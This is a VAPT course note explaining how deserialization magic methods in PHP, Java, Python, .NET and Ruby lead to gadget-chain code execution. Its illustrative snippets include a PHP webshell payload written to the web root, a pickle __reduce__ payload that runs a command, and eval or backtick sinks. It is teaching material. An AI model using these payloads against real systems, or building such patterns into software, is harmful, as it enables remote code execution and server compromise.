---
tags: [vapt, deserialization, intermediate]
difficulty: intermediate
module: "15 - Deserialization"
topic: "15.11 Magic Methods Abuse (__wakeup, __destruct, readObject)"
---

# 15.11 — Magic Methods Abuse

## What Are Magic Methods?

```
MAGIC METHODS (also called dunder methods or lifecycle hooks):
  Special methods called AUTOMATICALLY by the runtime during:
  - Object creation/destruction
  - Serialization/deserialization
  - Type casting
  - Operator overloading
  
  When an attacker controls what object gets deserialized,
  they control which magic methods get called!
  
  IF a magic method in any accessible class does something dangerous:
  → Deserialization of that class = code execution!
```

---

## PHP Magic Methods

```php
// CALLED DURING DESERIALIZATION:
__wakeup()  → Called immediately AFTER unserialize()
__construct() → Called when object created (but NOT during unserialize!)
__destruct()  → Called when object DESTROYED (after unserialize + use)

// CALLED DURING NORMAL OPERATIONS:
__toString()  → Called when object used as string (echo, print, concatenation)
__invoke()    → Called when object used as function: $obj()
__call()      → Called when undefined method called: $obj->undefined()
__get()       → Called when undefined property accessed: $obj->prop
__set()       → Called when undefined property set: $obj->prop = x

// WHY GADGET CHAINS WORK:
// 1. __wakeup() in class A calls method on class B (some property set via deser)
// 2. Class B's method calls __toString() on class C
// 3. Class C's __toString() calls exec() with attacker-controlled string!

// VULNERABLE PATTERN:
class FileLogger {
    public $logFile;
    public $logData;
    
    public function __destruct() {
        file_put_contents($this->logFile, $this->logData);
        // Attacker sets logFile="/var/www/html/shell.php"
        // logData="<?php system($_GET['cmd']); ?>"
        // → Webshell written on object destruction!
    }
}
```

---

## Java Magic Methods

```java
// java.io.Serializable INTERFACE:
private void readObject(ObjectInputStream ois) throws IOException {
    // Called during deserialization!
    // If gadget calls Runtime.exec() here → RCE!
}

private Object readResolve() throws ObjectStreamException {
    // Called AFTER readObject()
    // Return value replaces the deserialized object
    // Gadget chains may use this
}

void finalize() throws Throwable {
    // Called by GC when object is garbage collected
    // Less reliable (GC timing unpredictable)
}

// EXTERNALIZABLE INTERFACE:
public void readExternal(ObjectInput in) throws IOException {
    // Alternative to readObject()
}

// WHY GADGET CHAINS WORK:
// Library class has readObject() that:
// → Calls compareTo() on a property (attacker-controlled object)
// → compareTo() triggers invoke() on a proxy
// → Proxy calls exec() → RCE!
```

---

## Python Magic Methods

```python
# __reduce__ (used by pickle):
# Returns: (callable, args) → pickle calls callable(*args) during unpickling!
# Most direct Python deserialization RCE path.

class Malicious:
    def __reduce__(self):
        import os
        return (os.system, ("id",))

# __setstate__ (used by pickle for complex objects):
# Called with state dict after object created
class Malicious2:
    def __setstate__(self, state):
        import os
        os.system(state['cmd'])  # if state is attacker-controlled

# __init__ (called when object created):
# Not called during pickle.loads normally (uses __new__ + __setstate__)
# BUT: if __reduce__ returns (Class, args, state) → __init__ called with args!
```

---

## .NET Magic Methods

```csharp
// IDeserializationCallback.OnDeserialization():
// Called AFTER BinaryFormatter deserialization!
public void OnDeserialization(object sender) {
    // Dangerous code here → triggered by deserialization!
}

// ISerializable custom deserialization:
public MyClass(SerializationInfo info, StreamingContext context) {
    // Alternative readObject — called during BinaryFormatter deser
    this.cmd = info.GetString("cmd");
    System.Diagnostics.Process.Start(cmd);  // → RCE!
}

// Finalizer (C# destructor):
~MyClass() {
    // Called by GC
    // Less reliable for exploitation
}
```

---

## Ruby Magic Methods

```ruby
# marshal_load:
def marshal_load(state)
  # Called during Marshal.load with the saved state
  # Dangerous if state is attacker-controlled
  eval(state['code'])  # → RCE!
end

# initialize:
def initialize(data)
  # Called when object created (not during Marshal by default)
end

# to_s:
def to_s
  `#{@cmd}`  # backtick = shell execution!
end
# If deserialized object is ever printed → @cmd executes!
```

---

## Gadget Chain Overview

```
GADGET CHAIN CONCEPT:

Entry point:    Magic method automatically called on deser
    ↓
Gadget 1:       Legitimate class whose magic method calls method on Gadget 2
    ↓
Gadget 2:       Legitimate class whose method calls method on Gadget 3
    ↓
...
    ↓
Sink:           Dangerous operation (exec, file_write, SSRF, etc.)

EXAMPLE (simplified Java chain):
  PriorityQueue.readObject()
    → calls compare() on comparator (PriorityQueue stores comparator)
    → comparator is InvokerTransformer (Commons Collections)
    → InvokerTransformer.transform() calls arbitrary method
    → method chain leads to Runtime.exec("id")
    
ALL CLASSES USED ARE FROM STANDARD JAVA LIBRARIES OR COMMON FRAMEWORKS!
Attacker just crafts the right combination.

WHY THIS IS HARD TO PREVENT WITH BLOCKLISTS:
  Individual classes are legitimate
  Only the combination is malicious
  → Must disable deserialization entirely, not just block some classes!
```

---

## Related Notes
- [[01 - What is Serialization and Deserialization]] — fundamentals
- [[02 - Java Deserialization ysoserial]] — Java gadget chains
- [[03 - PHP Object Injection]] — PHP magic method exploitation
- [[04 - Python Pickle Deserialization]] — __reduce__ RCE
- [[12 - Defense Avoid Untrusted Deserialization]] — the only real fix
